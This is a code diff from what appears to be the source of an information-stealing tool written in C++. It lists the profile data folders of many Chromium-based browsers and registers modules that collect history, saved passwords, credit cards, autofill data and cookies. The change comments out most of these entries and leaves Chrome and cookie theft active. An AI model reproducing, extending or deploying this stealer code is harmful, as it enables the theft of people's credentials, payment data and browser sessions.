@@ -13,38 +13,38 @@
 
 //  BROWSER NAME, HAS A PROFILES SYSTEM,    PATH TO DATA
 static const std::vector<std::pair<std::pair<std::string, bool>, fs::path>> CHROMIUM_BROWSERS = {
-    {{"Amigo",       true},  Utils::getLocalPath()   / "Amigo"                / "User Data"                    },
-    {{"Torch",       true},  Utils::getLocalPath()   / "Torch"                / "User Data"                    },
-    {{"Kometa",      true},  Utils::getLocalPath()   / "Kometa"               / "User Data"                    },
-    {{"Orbitum",     true},  Utils::getLocalPath()   / "Orbitum"              / "User Data"                    },
-    {{"Epic Private",true},  Utils::getLocalPath()   / "Epic Privacy Browser" / "User Data"                    },
-    {{"Cent",        true},  Utils::getLocalPath()   / "CentBrowser"          / "User Data"                    },
-    {{"Vivaldi",     true},  Utils::getLocalPath()   / "Vivaldi"              / "User Data"                    },
-    {{"Irdium",      true},  Utils::getLocalPath()   / "Iridium"              / "User Data"                    },
-    {{"Vivaldi",     true},  Utils::getLocalPath()   / "Vivaldi"              / "User Data"                    },
-    {{"Chromium",    true},  Utils::getLocalPath()   / "Chromium"             / "User Data"                    },
-    {{"Thorium",     true},  Utils::getLocalPath()   / "Thorium"              / "User Data"                    },
-    {{"Opera",       false}, Utils::getRoamingPath() / "Opera Software"       / "Opera Stable"                 },
-    {{"Opera GX",    false}, Utils::getRoamingPath() / "Opera Software"       / "Opera GX Stable"              },
-    {{"7Star",       true},  Utils::getLocalPath()   / "7Star"                / "7Star"           / "User Data"},
-    {{"Sputnik",     true},  Utils::getLocalPath()   / "Sputnik"              / "Sputnik"         / "User Data"},
-    {{"Chrome SxS",  true},  Utils::getLocalPath()   / "Google"               / "Chrome SxS"      / "User Data"},
+//    {{"Amigo",       true},  Utils::getLocalPath()   / "Amigo"                / "User Data"                    },
+//    {{"Torch",       true},  Utils::getLocalPath()   / "Torch"                / "User Data"                    },
+//    {{"Kometa",      true},  Utils::getLocalPath()   / "Kometa"               / "User Data"                    },
+//    {{"Orbitum",     true},  Utils::getLocalPath()   / "Orbitum"              / "User Data"                    },
+//    {{"Epic Private",true},  Utils::getLocalPath()   / "Epic Privacy Browser" / "User Data"                    },
+//    {{"Cent",        true},  Utils::getLocalPath()   / "CentBrowser"          / "User Data"                    },
+//    {{"Vivaldi",     true},  Utils::getLocalPath()   / "Vivaldi"              / "User Data"                    },
+//    {{"Irdium",      true},  Utils::getLocalPath()   / "Iridium"              / "User Data"                    },
+//    {{"Vivaldi",     true},  Utils::getLocalPath()   / "Vivaldi"              / "User Data"                    },
+//    {{"Chromium",    true},  Utils::getLocalPath()   / "Chromium"             / "User Data"                    },
+//    {{"Thorium",     true},  Utils::getLocalPath()   / "Thorium"              / "User Data"                    },
+//    {{"Opera",       false}, Utils::getRoamingPath() / "Opera Software"       / "Opera Stable"                 },
+//    {{"Opera GX",    false}, Utils::getRoamingPath() / "Opera Software"       / "Opera GX Stable"              },
+//    {{"7Star",       true},  Utils::getLocalPath()   / "7Star"                / "7Star"           / "User Data"},
+//    {{"Sputnik",     true},  Utils::getLocalPath()   / "Sputnik"              / "Sputnik"         / "User Data"},
+//    {{"Chrome SxS",  true},  Utils::getLocalPath()   / "Google"               / "Chrome SxS"      / "User Data"},
     {{"Chrome",      true},  Utils::getLocalPath()   / "Google"               / "Chrome"          / "User Data"},
-    {{"Edge",        true},  Utils::getLocalPath()   / "Microsoft"            / "Edge"            / "User Data"},
-    {{"Uran",        true},  Utils::getLocalPath()   / "uCozMedia"            / "Uran"            / "User Data"},
-    {{"Yandex",      true},  Utils::getLocalPath()   / "Yandex"               / "YandexBrowser"   / "User Data"},
-    {{"Brave",       true},  Utils::getLocalPath()   / "BraveSoftware"        / "Brave-Browser"   / "User Data"},
-    {{"Atom",        true},  Utils::getLocalPath()   / "Mail.Ru"              / "Atom"            / "User Data"},
+//    {{"Edge",        true},  Utils::getLocalPath()   / "Microsoft"            / "Edge"            / "User Data"},
+//    {{"Uran",        true},  Utils::getLocalPath()   / "uCozMedia"            / "Uran"            / "User Data"},
+//    {{"Yandex",      true},  Utils::getLocalPath()   / "Yandex"               / "YandexBrowser"   / "User Data"},
+//    {{"Brave",       true},  Utils::getLocalPath()   / "BraveSoftware"        / "Brave-Browser"   / "User Data"},
+//    {{"Atom",        true},  Utils::getLocalPath()   / "Mail.Ru"              / "Atom"            / "User Data"},
 };
 
 ChromiumBrowsers::ChromiumBrowsers() {
-    this->modules.push_back(new CHistory());
-    this->modules.push_back(new CCreditCards());
-    this->modules.push_back(new CDownloads());
-    this->modules.push_back(new CPasswords());
-    this->modules.push_back(new CBookmarks());
+//    this->modules.push_back(new CHistory());
+//    this->modules.push_back(new CCreditCards());
+//    this->modules.push_back(new CDownloads());
+//    this->modules.push_back(new CPasswords());
+//    this->modules.push_back(new CBookmarks());
     this->modules.push_back(new CCookies());
-    this->modules.push_back(new CAutoFill());
+//    this->modules.push_back(new CAutoFill());
 }
 
 void ChromiumBrowsers::execute(fs::path &root) {
